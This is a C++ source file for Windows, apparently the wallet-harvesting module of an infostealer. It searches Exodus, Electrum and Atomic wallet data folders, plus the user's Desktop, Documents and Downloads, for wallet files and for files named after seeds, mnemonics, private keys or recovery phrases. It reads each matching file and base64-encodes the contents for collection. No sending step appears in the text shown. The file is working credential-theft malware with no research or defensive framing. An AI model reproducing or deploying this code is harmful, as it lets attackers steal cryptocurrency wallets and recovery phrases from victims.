#include "crypto_wallets.h"
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <chrono>
#include <sstream>
#include <iomanip>

namespace fs = std::filesystem;

#pragma comment(lib, "crypt32.lib")

void extract_crypto_wallet_files(const std::string& walletPath, const std::string& walletType, std::vector<CryptoWalletFile>& wallets);
void extract_crypto_backup_files(const std::string& backupPath, std::vector<CryptoWalletFile>& wallets);

std::vector<CryptoWalletFile> extract_crypto_wallets() {
    std::vector<CryptoWalletFile> wallets;

    // Get user home directory
    char userProfile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
        std::string userHome = userProfile;

        // Exodus wallet files
        std::string exodusPath = userHome + "\\AppData\\Roaming\\Exodus";
        extract_crypto_wallet_files(exodusPath, "exodus", wallets);

        // Electrum wallet files
        std::string electrumPath = userHome + "\\AppData\\Roaming\\Electrum\\wallets";
        extract_crypto_wallet_files(electrumPath, "electrum", wallets);

        // Atomic wallet files
        std::string atomicPath = userHome + "\\AppData\\Roaming\\atomic";
        extract_crypto_wallet_files(atomicPath, "atomic", wallets);

        // Check for seed phrase files in common locations
        std::vector<std::string> backupPaths = {
            userHome + "\\Desktop",
            userHome + "\\Documents",
            userHome + "\\Downloads"
        };

        for (const auto& backupPath : backupPaths) {
            extract_crypto_backup_files(backupPath, wallets);
        }
    }

    return wallets;
}

void extract_crypto_wallet_files(const std::string& walletPath, const std::string& walletType, std::vector<CryptoWalletFile>& wallets) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(walletPath)) {
            if (entry.is_regular_file()) {
                std::string filename = entry.path().filename().string();
                std::string lowerFilename = filename;
                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);

                bool isWalletFile = false;

                // Check file criteria based on wallet type
                if (walletType == "exodus") {
                    isWalletFile = lowerFilename.find("wallet") != std::string::npos ||
                                 lowerFilename.find(".exodus") != std::string::npos ||
                                 (lowerFilename.find(".json") != std::string::npos &&
                                  entry.file_size() < 10 * 1024 * 1024); // Max 10MB
                } else if (walletType == "electrum") {
                    isWalletFile = lowerFilename.find(".dat") != std::string::npos;
                } else if (walletType == "atomic") {
                    isWalletFile = lowerFilename.find("wallet") != std::string::npos ||
                                 lowerFilename.find(".json") != std::string::npos;
                }

                if (isWalletFile) {
                    CryptoWalletFile wallet;
                    wallet.walletName = filename;
                    wallet.walletType = walletType;
                    wallet.filePath = entry.path().string();
                    wallet.fileSize = entry.file_size();

                    // Get last modified time
                    auto lastWriteTime = entry.last_write_time();
                    auto time_t = std::chrono::system_clock::to_time_t(
                        std::chrono::system_clock::time_point(lastWriteTime.time_since_epoch()));
                    std::stringstream ss;
                    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                    wallet.lastModified = ss.str();

                    // Read file content if small enough
                    if (entry.file_size() < 1024 * 1024) { // Max 1MB
                        try {
                            std::ifstream file(entry.path(), std::ios::binary);
                            std::vector<char> buffer(entry.file_size());
                            file.read(buffer.data(), entry.file_size());

                            // Base64 encode
                            DWORD encodedSize = 0;
                            CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                                               CRYPT_STRING_BASE64, nullptr, &encodedSize);

                            if (encodedSize > 0) {
                                std::string encoded(encodedSize, '\0');
                                CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                                                   CRYPT_STRING_BASE64, (char*)encoded.data(), &encodedSize);
                                encoded.resize(encodedSize - 1); // Remove null terminator
                                wallet.fileContent = encoded;
                            }
                        } catch (const std::exception&) {
                            // Skip file content on error
                        }
                    }

                    wallets.push_back(wallet);
                }
            }
        }
    } catch (const std::exception&) {
        // Skip inaccessible directories
    }
}

void extract_crypto_backup_files(const std::string& backupPath, std::vector<CryptoWalletFile>& wallets) {
    try {
        std::vector<std::string> seedKeywords = {"seed", "mnemonic", "backup", "wallet", "private", "key", "recovery"};

        for (const auto& entry : fs::directory_iterator(backupPath)) {
            if (entry.is_regular_file()) {
                std::string filename = entry.path().filename().string();
                std::string lowerFilename = filename;
                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);

                // Check if file matches criteria
                bool matchesKeyword = false;
                for (const auto& keyword : seedKeywords) {
                    if (lowerFilename.find(keyword) != std::string::npos) {
                        matchesKeyword = true;
                        break;
                    }
                }

                bool isTextFile = lowerFilename.find(".txt") != std::string::npos ||
                                lowerFilename.find(".json") != std::string::npos ||
                                lowerFilename.find(".dat") != std::string::npos ||
                                lowerFilename.find(".wallet") != std::string::npos;

                if (matchesKeyword && isTextFile && entry.file_size() < 1024 * 1024) { // Max 1MB
                    CryptoWalletFile wallet;
                    wallet.walletName = filename;
                    wallet.walletType = "backup";
                    wallet.filePath = entry.path().string();
                    wallet.fileSize = entry.file_size();

                    // Get last modified time
                    auto lastWriteTime = entry.last_write_time();
                    auto time_t = std::chrono::system_clock::to_time_t(
                        std::chrono::system_clock::time_point(lastWriteTime.time_since_epoch()));
                    std::stringstream ss;
                    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                    wallet.lastModified = ss.str();

                    // Read file content
                    try {
                        std::ifstream file(entry.path(), std::ios::binary);
                        std::vector<char> buffer(entry.file_size());
                        file.read(buffer.data(), entry.file_size());

                        // Base64 encode
                        DWORD encodedSize = 0;
                        CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                                           CRYPT_STRING_BASE64, nullptr, &encodedSize);

                        if (encodedSize > 0) {
                            std::string encoded(encodedSize, '\0');
                            CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                                               CRYPT_STRING_BASE64, (char*)encoded.data(), &encodedSize);
                            encoded.resize(encodedSize - 1); // Remove null terminator
                            wallet.fileContent = encoded;
                        }
                    } catch (const std::exception&) {
                        // Skip file content on error
                    }

                    wallets.push_back(wallet);
                }
            }
        }
    } catch (const std::exception&) {
        // Skip inaccessible directories
    }
}
